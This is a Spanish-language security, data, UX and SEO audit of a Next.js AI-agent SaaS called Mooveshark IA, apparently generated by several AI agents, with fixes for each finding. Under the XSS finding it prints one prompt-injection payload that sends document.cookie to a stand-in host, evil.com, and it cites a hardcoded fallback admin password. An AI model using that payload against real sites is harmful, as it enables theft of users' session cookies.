# Análisis Integral — Mooveshark IA

**Fecha:** 18 de junio de 2026  
**Stack:** Next.js 14 (App Router) · TypeScript · Tailwind CSS · Drizzle ORM · Neon PostgreSQL · NextAuth v5 · Vercel AI SDK · Anthropic Claude  
**Agentes ejecutados:** UX/UI · Data/Infraestructura · SEO · Reliability/Edge Cases · Arquitectura Fullstack  

---

## Resumen Ejecutivo

| Área | Crítico | Importante | Menor | Total |
|------|---------|------------|-------|-------|
| Seguridad / Reliability | 6 | 10 | 6 | 22 |
| Arquitectura / Código | 5 | 12 | 10 | 27 |
| Base de Datos | 5 | 7 | 5 | 17 |
| UX / Accesibilidad | 4 | 9 | 10 | 23 |
| SEO Técnico | 5 | 5 | 4 | 14 |
| **Total** | **25** | **43** | **35** | **103** |

> **Nota de triage:** Los ítems marcados con 🔴 en diferentes áreas son el mismo problema visto desde distintos ángulos (ej: XSS en ChatInterface, endpoints sin auth). Se unifican en la sección de acción.

---

## CRÍTICOS — Acción inmediata

### SEC-C1 · Endpoints de admin sin autenticación — data breach abierto
**Visto por:** Reliability + Arquitectura  
**Archivos:**
- `src/app/api/clients/route.ts` — GET línea 155, POST línea 36
- `src/app/api/leads/route.ts` — GET línea 148, POST sin auth
- `src/app/api/clients/[id]/reset-password/route.ts` — línea 14

Los tres endpoints GET exponen **todos los datos de clientes y leads** (PII, `passwordHash` incluido) sin requerir ninguna sesión. El endpoint de reset-password permite que cualquier actor externo resetee la contraseña de cualquier cliente pasando su UUID. El POST de clientes permite crear clientes ilimitados sin autenticación.

**Fix para todos:**
```ts
const session = await auth()
const role = (session?.user as { role?: string })?.role
if (!session || role !== 'admin') {
  return NextResponse.json({ error: 'No autorizado' }, { status: 401 })
}
```

---

### SEC-C2 · Credenciales de admin hardcodeadas con fallback inseguro
**Visto por:** Reliability + Arquitectura + DB  
**Archivo:** `src/lib/auth/config.ts` — líneas 5-6

```ts
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD ?? 'changeme123'
```

Si `ADMIN_PASSWORD` no está seteado en producción (error de deploy, nuevo entorno), el sistema acepta `changeme123`. Adicionalmente, línea 18 hace `console.log` de la variable de entorno de email del admin en cada intento de login.

**Fix:**
```ts
const ADMIN_EMAIL    = process.env.ADMIN_LOGIN_EMAIL    ?? (() => { throw new Error('ADMIN_LOGIN_EMAIL not set') })()
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD ?? (() => { throw new Error('ADMIN_PASSWORD not set') })()
// Eliminar todos los console.log con variables de entorno o credenciales
```

---

### SEC-C3 · Contraseña enviada en texto plano por email
**Visto por:** Reliability + Arquitectura  
**Archivo:** `src/app/api/clients/route.ts` — línea 120

```ts
<p><b>Contraseña:</b> ${password}</p>  // password en texto plano
```

La contraseña original (antes del hash) se incluye en el HTML del email de bienvenida. El campo `mustChangePassword` existe pero no se usa en la creación de cliente desde `CreateClientModal`.

**Fix:** Eliminar la línea con la contraseña del email. Usar el mismo flujo que `reset-password`: generar una contraseña temporal, setear `mustChangePassword: true`, y enviar la temporal (no la que el admin ingresó).

---

### SEC-C4 · XSS en ChatInterface — `dangerouslySetInnerHTML` sin sanitizar
**Visto por:** UX/UI (C-3) + Reliability (C-1) + Arquitectura (I-6)  
**Archivo:** `src/components/dashboard/ChatInterface.tsx` — línea 246

El contenido del LLM se renderiza como HTML crudo después de reemplazos con regex, sin ningún paso de sanitización. Un payload de prompt injection como `**<img src=x onerror=fetch('evil.com?c='+document.cookie)>**` se ejecutaría en el browser del cliente.

**Fix:**
```bash
npm install dompurify @types/dompurify
```
```tsx
import DOMPurify from 'dompurify'

<div
  className="prose-sm"
  dangerouslySetInnerHTML={{
    __html: DOMPurify.sanitize(renderContent(msg.content), {
      ALLOWED_TAGS: ['strong','em','ul','li','p','br'],
      ALLOWED_ATTR: ['class']
    })
  }}
/>
```

---

### SEC-C5 · Cross-tenant: `/api/chat` no valida que el agente pertenezca al cliente autenticado
**Visto por:** DB (C-4) + Reliability (M-1)  
**Archivo:** `src/app/api/chat/route.ts` — líneas 25-28

El endpoint no verifica sesión. Cualquier request puede enviar el `agentId` de otro tenant, ver su `systemPrompt` (puede contener scripts de ventas y datos sensibles), generar mensajes en su conversación, y consumir su cuota de interacciones.

**Fix:**
```ts
const session = await auth()
if (!session) return new Response(JSON.stringify({ error: 'No autorizado' }), { status: 401 })
const clientId = (session.user as { id: string }).id

const [agent] = await db.select().from(agents)
  .where(and(eq(agents.id, agentId), eq(agents.clientId, clientId)))
if (!agent) return new Response(JSON.stringify({ error: 'Agente no encontrado' }), { status: 404 })
```

---

### DB-C1 · Cliente creado sin agente si el insert falla — datos corruptos permanentes
**Visto por:** DB (C-5) + Reliability (I-4) + Arquitectura (C-4)  
**Archivo:** `src/app/api/clients/route.ts` — líneas 49-77

El cliente se inserta en DB **antes** de validar el `agentType`. Si `getAgentDefinition` retorna `null` después de que el cliente fue insertado, el cliente existe sin agente y su email queda bloqueado (violación de unique constraint si se intenta crear de nuevo).

**Fix — mover validación ANTES del insert y usar transacción:**
```ts
// Validar agentType primero
const definition = getAgentDefinition(agentType)
if (!definition) return NextResponse.json({ error: 'Tipo de agente inválido' }, { status: 400 })

// Luego insertar ambos en la misma transacción
await db.transaction(async (tx) => {
  const [client] = await tx.insert(clients).values({ ...clientData }).returning()
  const [agent]  = await tx.insert(agents).values({ clientId: client.id, ... }).returning()
  if (leadId) await tx.update(leads).set({ status: 'converted' }).where(eq(leads.id, leadId))
})
```

> **Nota:** Requiere migrar el driver de `neon-http` a `neon-serverless` para soportar transacciones (ver DB-I5).

---

### SEO-C1 · `metadataBase` ausente — todas las URLs de Open Graph son inválidas
**Visto por:** SEO  
**Archivo:** `src/app/layout.tsx` — línea 21

Sin `metadataBase`, Next.js no puede construir URLs absolutas para `og:image`, `og:url`, ni Twitter cards. Los scrapers de LinkedIn, WhatsApp, Facebook y Google no pueden resolver rutas relativas — los previews no se generan en ningún compartido social.

**Fix en `src/app/layout.tsx`:**
```ts
export const metadata: Metadata = {
  metadataBase: new URL('https://mooveshark.ai'),
  title: {
    default: 'Mooveshark IA — Agentes de IA para empresas B2B',
    template: '%s | Mooveshark IA',
  },
  description: 'Activá agentes de IA especializados en atención al cliente, ventas y RRHH en menos de 48 horas. Sin código, sin meses de implementación. Para empresas B2B en Latam.',
  openGraph: {
    url: 'https://mooveshark.ai',
    siteName: 'Mooveshark IA',
    type: 'website',
    locale: 'es_AR',
    images: [{ url: '/og-image.png', width: 1200, height: 630, alt: 'Mooveshark IA' }],
  },
  twitter: {
    card: 'summary_large_image',
    images: ['/og-image.png'],
  },
}
```

---

### SEO-C2 · Ausencia de `sitemap.xml` y `robots.txt` — rutas privadas indexables
**Visto por:** SEO  
**Archivos:** No existen en `src/app/` ni `public/`

Google puede indexar `/dashboard/chat`, `/admin/clients`, `/change-password`. El directorio `public/` está completamente vacío. Sin sitemap, el crawler descubre páginas solo por links.

**Crear `src/app/sitemap.ts` y `src/app/robots.ts`:**
```ts
// robots.ts
export default function robots() {
  return {
    rules: [{ userAgent: '*', allow: '/', disallow: ['/dashboard/','/admin/','/api/','/change-password/'] }],
    sitemap: 'https://mooveshark.ai/sitemap.xml',
  }
}
```

---

### SEO-C3 · Ausencia total de datos estructurados JSON-LD
**Visto por:** SEO  
**Evidencia:** `grep -r "application/ld+json" src` — sin resultados

Las 7 preguntas de `FAQSection` no generan rich snippets. Sin schema `Organization`/`SoftwareApplication`, Google no puede construir el Knowledge Panel. Un FAQPage schema bien implementado puede aumentar el espacio visual en SERP 2x y el CTR 20-30%.

**Fix:** Agregar en `src/app/page.tsx` un bloque `<script type="application/ld+json">` con schemas de `Organization`, `SoftwareApplication` y `FAQPage`. Ver detalle completo en reporte SEO.

---

### SEO-C4 · `FAQSection` usa `'use client'` — respuestas no indexables en SSR
**Visto por:** SEO  
**Archivo:** `src/components/landing/FAQSection.tsx` — línea 1

El accordion renderiza respuestas condicionalmente (`{open === i && (...)}`) — cuando el estado es `null`, ninguna respuesta aparece en el HTML del servidor. Google puede no indexar las respuestas si no ejecuta JS.

**Fix:** Reemplazar el accordion con `<details>/<summary>` nativos (no requiere JS, todo el contenido está en HTML inicial). Ver código completo en reporte SEO.

---

### SEO-C5 · Rutas privadas sin `noindex` — estructura interna expuesta a buscadores
**Visto por:** SEO  
**Archivos:** `src/app/auth/login/page.tsx`, `src/app/dashboard/layout.tsx`, `src/app/admin/page.tsx`, `src/app/change-password/page.tsx`

**Fix en cada página privada:**
```ts
export const metadata: Metadata = {
  robots: { index: false, follow: false },
}
```

---

### UX-C1 · Formulario de contacto silencia errores de red — usuario queda en limbo
**Visto por:** UX/UI  
**Archivo:** `src/components/landing/ContactSection.tsx` — línea 79

El bloque `catch` solo ejecuta `console.error(e)`. Si la llamada a `/api/leads` falla, el usuario ve el formulario sin ningún mensaje de error. El botón vuelve al estado inicial sin contexto, llevando al usuario a intentar de nuevo o abandonar.

**Fix:**
```tsx
} catch (e) {
  console.error(e)
  setError('Hubo un error al enviar tu solicitud. Por favor intentá de nuevo.')
}
```

---

### UX-C2 · Ningún `<label>` tiene `htmlFor` — formularios inaccesibles para screen readers
**Visto por:** UX/UI  
**Archivos:** `ContactSection.tsx`, `LoginForm.tsx`, `AgentConfigForm.tsx`, `ChangePasswordForm.tsx`, `CreateClientModal.tsx`, `ConvertLeadModal.tsx`

Ningún `<label>` en el proyecto usa `htmlFor`. Las inputs no tienen `id`. Error WCAG 2.1 Level A (1.3.1). Hacer clic en el label no enfoca el input.

**Fix (patrón a replicar en todos los campos):**
```tsx
<label htmlFor="fullName" className={labelClass}>Nombre completo</label>
<input id="fullName" className={inputClass} ... />
```

---

### UX-C3 · Password inicial en campo `type="text"` — contraseña visible en pantalla del admin
**Visto por:** UX/UI + Arquitectura  
**Archivos:** `src/components/admin/CreateClientModal.tsx` línea 121, `src/components/admin/ConvertLeadModal.tsx` línea 181

**Fix:**
```tsx
<input className={inputClass} type="password" placeholder="Mínimo 8 caracteres" ... />
```

---

### ARCH-C1 · Sin validación centralizada de variables de entorno al arranque
**Visto por:** Arquitectura  
**Archivos:** `src/lib/db/index.ts`, `src/lib/agents/orchestrator.ts`, múltiples routes

La app puede iniciar sin `ANTHROPIC_API_KEY`, `DATABASE_URL`, o `AUTH_SECRET` y solo falla en runtime al primer uso.

**Fix — crear `src/env.ts`:**
```ts
import { z } from 'zod'
const envSchema = z.object({
  DATABASE_URL:       z.string().url(),
  ANTHROPIC_API_KEY:  z.string().min(1),
  AUTH_SECRET:        z.string().min(32),
  ADMIN_LOGIN_EMAIL:  z.string().email(),
  ADMIN_PASSWORD:     z.string().min(12),
  GMAIL_USER:         z.string().email().optional(),
  GMAIL_APP_PASSWORD: z.string().optional(),
})
export const env = envSchema.parse(process.env)
```

---

## IMPORTANTES — Próximo sprint

### DATA · Ausencia total de índices en el schema
**Archivo:** `src/lib/db/schema.ts`

Ninguna tabla define índices fuera de las PKs. Columnas críticas sin índice:

| Tabla | Columna(s) | Query afectada |
|-------|-----------|----------------|
| `agents` | `client_id` | Dashboard, chat, config — todas las pages del cliente |
| `conversations` | `client_id`, `agent_id` | Dashboard page count |
| `messages` | `(conversation_id, created_at)` | Cada turno de chat |
| `clients` | `email` | Login (auth) — **crítico** |
| `usage_logs` | `client_id`, `created_at` | Billing futuro |
| `leads` | `status`, `created_at` | Filtros y ORDER BY en admin |

**Fix — agregar en schema.ts:**
```ts
export const agents = pgTable('agents', { /* cols */ }, (t) => ({
  clientIdIdx: index('agents_client_id_idx').on(t.clientId),
}))
export const messages = pgTable('messages', { /* cols */ }, (t) => ({
  convCreatedIdx: index('messages_conv_created_idx').on(t.conversationId, t.createdAt),
}))
// Equivalente para conversations, usage_logs, leads
```

---

### DATA · N+1 query en listado de clientes admin
**Archivo:** `src/app/admin/clients/page.tsx` — líneas 16-20

Con 100 clientes = 101 queries a Neon. Puede causar timeout de Vercel y agotar el connection pool.

**Fix:**
```ts
const result = await db
  .select({ client: clients, agent: agents })
  .from(clients)
  .leftJoin(agents, eq(agents.clientId, clients.id))
  .orderBy(desc(clients.createdAt))
// Agrupar en JS con Map
```

---

### DATA · GET /api/clients y /api/leads devuelven `passwordHash` en el select
**Archivo:** `src/app/api/clients/route.ts` — línea 157

`db.select()` sin proyección trae todas las columnas incluyendo `passwordHash`. Aplicar proyección explícita excluyendo campos sensibles.

---

### DATA · Driver `neon-http` no soporta transacciones — `db.transaction()` falla silenciosamente
**Archivo:** `src/lib/db/index.ts`

**Fix — migrar a WebSocket driver:**
```ts
import { Pool, neonConfig } from '@neondatabase/serverless'
import { drizzle } from 'drizzle-orm/neon-serverless'
import ws from 'ws'
neonConfig.webSocketConstructor = ws
const pool = new Pool({ connectionString: process.env.DATABASE_URL! })
export const db = drizzle(pool, { schema })
```

---

### DATA · `updatedAt` no se actualiza en UPDATEs — datos desincronizados
**Archivo:** `src/lib/db/schema.ts` — columnas `updated_at` en leads, clients, agents

`defaultNow()` solo aplica en INSERT. En updates que no pasan `updatedAt: new Date()`, la columna queda con el valor inicial. Aplicar trigger de PostgreSQL o incluir siempre `updatedAt: new Date()` en cada `.set()`.

---

### DATA · `message_count` y `lastMessageAt` nunca se actualizan
**Archivo:** `src/app/api/chat/route.ts` — callback `onFinish`

**Fix:**
```ts
onFinish: async ({ text, usage }) => {
  await Promise.all([
    db.insert(messages).values({ conversationId: convId!, role: 'assistant', content: text }),
    db.update(conversations).set({
      lastMessageAt: new Date(),
      messageCount: sql`${conversations.messageCount} + 1`,
    }).where(eq(conversations.id, convId!)),
    db.insert(usageLogs).values({
      clientId: agent.clientId, agentId,
      tokensIn: usage.promptTokens, tokensOut: usage.completionTokens,
    }),
  ])
}
```

---

### DATA · GET sin paginación — toda la tabla en cada request
**Archivos:** `src/app/api/leads/route.ts` línea 150, `src/app/api/clients/route.ts` línea 157, `src/app/admin/page.tsx` línea 13

Con 10k leads el payload puede superar el límite de Vercel (6MB para Node). Agregar `.limit(50).offset((page-1)*50)` y retornar metadata de paginación.

---

### DATA · `tone` y `language` deberían ser enums, no strings libres
**Archivo:** `src/lib/db/schema.ts` — líneas 58-59

Valor inválido pasa la DB constraint. Migrar a `pgEnum('tone', ['formal','friendly','neutral'])`.

---

### RELIABILITY · Memory leak — `setTimeout` sin cleanup al desmontar componentes
**Archivos:** `AgentConfigForm.tsx` línea 45, `ResetPasswordButton.tsx` línea 19, `CreateClientModal.tsx` líneas 51-56, `ConvertLeadModal.tsx` línea 64

Si el usuario navega antes de que expire el timeout, `router.refresh()` se ejecuta en la página incorrecta.

**Fix (patrón):**
```tsx
const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null)
useEffect(() => () => { if (timerRef.current) clearTimeout(timerRef.current) }, [])
// En el handler:
timerRef.current = setTimeout(() => setSaved(false), 3000)
```

---

### RELIABILITY · Race condition en streaming — sin `AbortController` ni cleanup
**Archivo:** `src/components/dashboard/ChatInterface.tsx` — líneas 97-108

Si el usuario navega mientras el stream está activo, el `reader.read()` sigue ejecutando en loop y consume tokens de Anthropic. No hay cleanup en `useEffect`.

**Fix:**
```tsx
const abortRef = useRef<AbortController | null>(null)
useEffect(() => () => { abortRef.current?.abort() }, [])
// En sendMessage:
const controller = new AbortController()
abortRef.current = controller
const res = await fetch('/api/chat', { ..., signal: controller.signal })
```

---

### RELIABILITY · Nodemailer en reset-password sin try/catch propio — contraseña actualizada pero email no enviado
**Archivo:** `src/app/api/clients/[id]/reset-password/route.ts` — líneas 32-83

Si el envío falla, la contraseña fue actualizada en DB pero el cliente no la recibió. Queda bloqueado sin acceso.

**Fix:** Envolver el bloque de Nodemailer en su propio try/catch, retornar `{ success: true, emailSent: false }` si falla el email (no error 500), y loguear el fallo para intervención manual.

---

### RELIABILITY · `console.log` de credenciales en producción en auth/config.ts
**Archivo:** `src/lib/auth/config.ts` — líneas 18-21

Expone información del admin en logs de Vercel visibles para cualquier colaborador del proyecto.

**Fix:** Eliminar o condicionar a `process.env.NODE_ENV === 'development'`.

---

### RELIABILITY · `onFinish` de streaming puede fallar silenciosamente — historial corrupto
**Archivo:** `src/app/api/chat/route.ts` — líneas 99-109

Si la DB falla en `onFinish`, el stream ya fue enviado al cliente pero el mensaje no queda guardado. El próximo turno enviará un historial incompleto al LLM. Envolver en try/catch con logging estructurado.

---

### RELIABILITY · Inngest — errores de Resend sin distinción entre permanentes y transitorios
**Archivo:** `src/lib/inngest/functions.ts` — líneas 14-63

Errores 4xx (email inválido) causan retries infinitos de Inngest. Distinguir con `if (result.error.statusCode >= 400 && < 500) return { skipped: true }`.

---

### ARCH · `AGENT_LABELS` duplicado 7 veces — inconsistencias ya presentes
**Archivos:** `api/leads/route.ts`, `api/clients/route.ts`, `dashboard/page.tsx`, `AgentConfigForm.tsx`, `CreateClientModal.tsx`, `ConvertLeadModal.tsx`, `admin/clients/page.tsx`

`gastronomy-pastry` existe en algunos pero no en otros. Agregar un nuevo tipo de agente requiere 7+ cambios.

**Fix:** Centralizar en `src/lib/agents/definitions.ts`:
```ts
export const AGENT_LABELS: Record<AgentType, string> = Object.fromEntries(
  AGENT_DEFINITIONS.map(d => [d.type, d.label])
) as Record<AgentType, string>
```

---

### ARCH · `AgentType` desincronizado entre types, schema DB y validaciones Zod
**Archivos:** `src/types/index.ts`, `src/lib/db/schema.ts`, `src/lib/validations/schemas.ts`

`agentConfigSchema` no tiene `gastronomy-pastry`. El POST de clientes usa `z.string()` en lugar del enum, permitiendo insertar cualquier valor. El cast `as 'customer-support'` en línea 71 suprime el error de TS en lugar de corregirlo.

**Fix:** `agentType: z.enum([...AGENT_DEFINITIONS.map(d => d.type)] as const)` — única fuente de verdad.

---

### ARCH · Dos sistemas de email paralelos (Nodemailer + Resend) — lógica inline de 50+ líneas en cada route
**Archivos:** `api/leads/route.ts`, `api/clients/route.ts`, `api/clients/[id]/reset-password/route.ts`, `lib/inngest/functions.ts`

**Fix:** Crear `src/lib/email/index.ts` con funciones `sendLeadNotification()`, `sendClientWelcome()`, `sendPasswordReset()`. Elegir un proveedor (Resend recomendado). Mover templates HTML a `src/lib/email/templates/`.

---

### ARCH · Orchestrator ignorado — lógica de chat duplicada en route
**Archivos:** `src/lib/agents/orchestrator.ts`, `src/app/api/chat/route.ts`

El route reimplementa `streamAgent` completo. Cualquier cambio al modelo debe hacerse en dos lugares.

**Fix:** Extender `streamAgent` para aceptar contexto adicional y usar desde el route.

---

### ARCH · Tipos de NextAuth evasivos con `Record<string, unknown>` en 8+ lugares
**Archivo:** `src/lib/auth/config.ts` y todas las pages del dashboard

**Fix:** Augmentar los tipos de NextAuth:
```ts
// src/types/next-auth.d.ts
declare module 'next-auth' {
  interface Session {
    user: { id: string; role: 'admin' | 'client'; company?: string; plan?: string } & DefaultSession['user']
  }
}
```

---

### ARCH · Formato de respuesta inconsistente entre API routes
Algunas routes devuelven `{ error }` (sin `success`), otras `{ success, data }`. El tipo `ApiResponse<T>` existe pero no se usa.

**Fix:** Crear helpers centralizados:
```ts
// src/lib/api/response.ts
export const ok  = <T>(data: T) => NextResponse.json({ success: true, data })
export const err = (error: string, status = 400) => NextResponse.json({ success: false, error }, { status })
```

---

### ARCH · `getActiveAgent` duplicado en 3 pages del dashboard
**Archivos:** `dashboard/chat/page.tsx`, `dashboard/config/page.tsx`, `dashboard/page.tsx`

**Fix:** Crear `src/lib/db/queries.ts` con `getClientActiveAgent(clientId: string)`.

---

### ARCH · `next.config.mjs` usa API experimental obsoleta
`serverComponentsExternalPackages` se movió fuera de `experimental` en Next.js 14.2+.

**Fix:** `serverExternalPackages: ['@neondatabase/serverless']` (sin wrapper `experimental`).

---

### ARCH · Stripe en dependencies pero completamente sin implementar
`stripe@^17.5.0` instalado. Campos `stripeCustomerId`, `stripeSubscriptionId` en schema. La página `/dashboard/billing` referenciada en Inngest no existe. El plan nunca cambia de `trial` a `active`.

**Acción:** Implementar el flujo completo (webhook `checkout.session.completed`) o eliminar la dependencia hasta que sea prioritario.

---

### ARCH · Sin rate limiting en endpoints costosos
`POST /api/chat` (llamadas a Anthropic = costo directo), `POST /api/leads` (flood de datos falsos), y auth no tienen ningún rate limiting por IP.

**Fix:** Middleware con Upstash Ratelimit o `@vercel/edge`:
```ts
// src/middleware.ts — agregar rate limiting antes de las routes de API
```

---

### UX · Sin sistema de toast/notificaciones globales — feedback fragmentado
**Archivos:** `AgentConfigForm.tsx`, `CreateClientModal.tsx`, `ConvertLeadModal.tsx`

Cada componente implementa su propio feedback de éxito de forma diferente (botón verde, cierre de modal, nada). No hay sistema centralizado.

**Fix:** `npm install sonner` + `<Toaster />` en `layout.tsx` + `toast.success('Cambios guardados')` reemplazando estados locales.

---

### UX · Contraste insuficiente en textos `text-white/40` y `text-white/25`
**Archivos:** `Footer.tsx`, `HeroSection.tsx`, `DashboardSidebar.tsx`, `ChatInterface.tsx`

`rgba(255,255,255,0.40)` sobre `shark-dark` ≈ 3.6:1 (mínimo WCAG AA es 4.5:1). `text-white/25` ≈ 2.3:1.

**Fix:** Elevar a `text-white/55` o superior para texto de cuerpo. `text-white/35` mínimo para placeholders/hints.

---

### UX · Tabla de leads admin no es responsive — se corta en tablet
**Archivo:** `src/components/admin/AdminLeadsTable.tsx` — líneas 178-236

Falta `overflow-x-auto` en el wrapper. En < 1024px las columnas Urgencia, Estado y el botón Convertir quedan fuera del viewport.

**Fix:** `<div className="overflow-x-auto"><table className="min-w-[800px]">`

---

### UX · ChatInterface sin botón "Nueva conversación"
**Archivo:** `src/components/dashboard/ChatInterface.tsx`

No hay forma de reiniciar el chat sin recargar la página.

**Fix:** Agregar botón en el header:
```tsx
<button onClick={() => { setMessages([]); setConversationId(undefined); setShowInfo(true) }}>
  + Nueva
</button>
```

---

### UX · Estado vacío del dashboard sin CTA — nuevo cliente ve pantalla vacía
**Archivo:** `src/app/dashboard/page.tsx` — líneas 97-102

"Contactá a soporte" sin link ni email de contacto. El cliente no sabe qué hacer.

**Fix:** Agregar `<a href="mailto:soporte@mooveshark.ia">` y contexto de que el agente estará activo pronto.

---

### UX · Validación inline de email ausente en formulario de contacto
**Archivo:** `src/components/landing/ContactSection.tsx`

`"juan@"` pasa el gate de `canNext1`. El error solo aparece al submit (si el server valida).

**Fix:**
```tsx
const isEmailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email)
{form.email && !isEmailValid && <p className="text-xs text-red-400 mt-1">Email inválido</p>}
```

---

### UX · Emoji en botones sin `aria-label` — botón de envío inaccesible
**Archivos:** Múltiples. Caso más crítico: `ChatInterface.tsx` línea 316 (botón enviar sin label).

**Fix:**
```tsx
<button aria-label="Enviar mensaje" ...>
<span aria-hidden="true">→</span>
</button>
```

---

### SEO · Open Graph sin imagen — previews en blanco en compartidos sociales
**Evidencia:** `public/` vacío, sin `og-image.png`

Crear imagen 1200x630px con logo y tagline, guardar en `public/og-image.png`. Ya referenciada en el fix de SEO-C1.

---

### SEO · `section-label` usa `<p>` — rompe semántica HTML
**Archivos:** `AgentsSection.tsx`, `HowItWorksSection.tsx`, `PricingSection.tsx`, `FAQSection.tsx`, `ContactSection.tsx`

Un `<p>` antes del `<h2>` añade nodos de texto redundantes. Cambiar a `<span>` o `<div>`.

---

### SEO · `description` meta tag sin keywords de intención comercial
**Archivo:** `src/app/layout.tsx`

La descripción actual: "Soluciones de inteligencia artificial listas para activar." no menciona casos de uso específicos ni diferenciadores.

**Fix:** "Activá agentes de IA especializados en atención al cliente, ventas y RRHH en menos de 48 horas. Sin código. Para empresas B2B en Latam."

---

## MENORES — Backlog de calidad

### Seguridad / Reliability
- **M-SEC1** `generateTempPassword` usa `Math.random()` — migrar a `randomInt` de `crypto` (`reset-password/route.ts:10`)
- **M-SEC2** Emitir `console.log` de errores internos sin loguear el error real en componentes (`catch {}` vacíos)
- **M-SEC3** `scrollIntoView` en ChatInterface sin `loading` en dependencias del `useEffect` (`ChatInterface.tsx:60`)
- **M-SEC4** `TEAM_EMAIL` hardcodeado en Inngest functions — mover a env var

### Base de Datos
- **M-DB1** `cost` en `usageLogs` siempre 0 — el callback `onFinish` no calcula ni guarda tokens (ya cubierto en importante DB)
- **M-DB2** `mustChangePassword` en JWT token — evitar query a DB en cada render del dashboard layout
- **M-DB3** `reset-password` selecciona cliente completo incluyendo `passwordHash` cuando solo necesita `email` y `company`

### Arquitectura
- **M-ARCH1** `tailwind.config.js` en JS en lugar de TypeScript — renombrar a `.ts`
- **M-ARCH2** `cn()` de `@/lib/utils` no usado en construcción de clases — reemplazar concatenaciones manuales
- **M-ARCH3** `message_count` y `lastMessageAt` en `conversations` nunca se actualizan (cubierto en importante DB)
- **M-ARCH4** Tipos locales `Lead` redefinidos en `AdminLeadsTable` y `ConvertLeadModal` en lugar de usar `typeof leads.$inferSelect`
- **M-ARCH5** `sleep()` exportada en `utils.ts` — función de debug sin contexto
- **M-ARCH6** `admin/clients/page.tsx` sin `maxDuration` export con N+1 queries que pueden superar timeout de Vercel
- **M-ARCH7** Admin no tiene `layout.tsx` compartido — header y nav duplicados entre páginas admin
- **M-ARCH8** `auth()` llamado dos veces por request en dashboard (layout + page) — cachear con React `cache()`

### UX / Accesibilidad
- **M-UX1** `prefers-reduced-motion` sin soporte — animaciones `fade-in`/`fade-up` en `globals.css` pueden causar malestar
- **M-UX2** `bg-white/3` y `bg-white/8` son valores fuera de escala Tailwind — usar sintaxis `bg-white/[0.03]`
- **M-UX3** Falta `loading.tsx` en `src/app/dashboard/` — pantalla en blanco en conexiones lentas
- **M-UX4** `ChangePasswordForm` sin toggle de visibilidad en campo "Confirmar contraseña" (inconsistente con "Nueva contraseña")
- **M-UX5** `ConvertLeadModal` cierra sin confirmación si hay datos llenados — pérdida de trabajo del admin
- **M-UX6** Texto de bottom nav en `text-[10px]` — debajo del mínimo de legibilidad en mobile (mínimo 12px)
- **M-UX7** Emojis decorativos en `AgentsSection` y `HowItWorksSection` sin `aria-hidden="true"`
- **M-UX8** Logo del navbar sin `aria-label` en el `<Link>` — se anuncia como "tiburón" en screen readers
- **M-UX9** Stats del hero (`48h`, `7+`, etc.) sin semántica `<dl>/<dt>/<dd>` — screen reader los lee como texto plano
- **M-UX10** `AgentConfigForm` sin contador de caracteres en textarea del system prompt

### SEO
- **M-SEO1** `next/image` no usado en landing — cuando se agreguen imágenes habrá CLS si no se adopta la convención
- **M-SEO2** `<html lang="es">` sin región — usar `lang="es-AR"` para geo-targeting correcto en Latam
- **M-SEO3** Logo implementado con emoji en lugar de `<img>` o SVG con alt — no indexable por Google Image Search
- **M-SEO4** Emojis decorativos en secciones sin `aria-hidden="true"` (compartido con UX-M7)

---

## Plan de Acción Recomendado

### Semana 1 — Seguridad crítica (bloquea el go-live seguro)
1. `SEC-C1` — Agregar `auth()` + verificación de rol en todos los endpoints de admin
2. `SEC-C2` — Eliminar fallbacks hardcodeados de credenciales + console.logs de secrets
3. `SEC-C3` — Eliminar password en texto plano del email de bienvenida
4. `SEC-C4` — Sanitizar `dangerouslySetInnerHTML` con DOMPurify
5. `SEC-C5` — Validar `agentId` pertenece al cliente autenticado en `/api/chat`
6. `DB-C1` — Mover validación de agentType antes del insert de cliente

### Semana 2 — SEO y visibilidad (impacto inmediato en adquisición)
1. `SEO-C1` — `metadataBase` + Twitter cards en `layout.tsx`
2. `SEO-C2` — Crear `sitemap.ts` y `robots.ts`
3. `SEO-C3` — JSON-LD (Organization + SoftwareApplication + FAQPage)
4. `SEO-C4` — Refactorizar FAQSection a Server Component con `<details>/<summary>`
5. `SEO-C5` — `noindex` en rutas privadas
6. Crear `public/og-image.png` (1200x630px)

### Semana 3 — Estabilidad de datos y arquitectura
1. `DATA` — Agregar todos los índices faltantes (una migración de Drizzle)
2. `DATA` — Migrar driver a `neon-serverless` para transacciones reales
3. `DATA` — Agregar paginación en GET de leads y clients
4. `ARCH-C1` — Crear `src/env.ts` con validación de env vars
5. `ARCH` — Centralizar `AGENT_LABELS` y corregir `AgentType` desincronizado
6. `ARCH` — Unificar sistema de email en `src/lib/email/`

### Semana 4 — UX y calidad de código
1. `UX-C1` — Error handling en ContactSection
2. `UX-C2` — `htmlFor` + `id` en todos los formularios (búsqueda global)
3. `UX-C3` — `type="password"` en campos de contraseña de modales admin
4. Integrar `sonner` para toasts globales
5. `RELIABILITY` — `AbortController` en streaming del chat
6. `RELIABILITY` — Cleanup de `setTimeout` en componentes

---

## Archivos con mayor densidad de problemas

| Archivo | Issues críticos | Issues importantes |
|---------|----------------|-------------------|
| `src/lib/auth/config.ts` | 2 | 2 |
| `src/app/api/clients/route.ts` | 4 | 2 |
| `src/components/dashboard/ChatInterface.tsx` | 2 | 3 |
| `src/app/api/clients/[id]/reset-password/route.ts` | 2 | 2 |
| `src/lib/db/schema.ts` | 1 | 5 |
| `src/app/layout.tsx` | 2 | 2 |
| `src/components/landing/FAQSection.tsx` | 1 | 2 |

---

*Generado por análisis paralelo de 5 agentes especializados: ux-specialist · data-infra-specialist · seo-specialist · edge-case-reliability-specialist · fullstack-implementation-specialist*
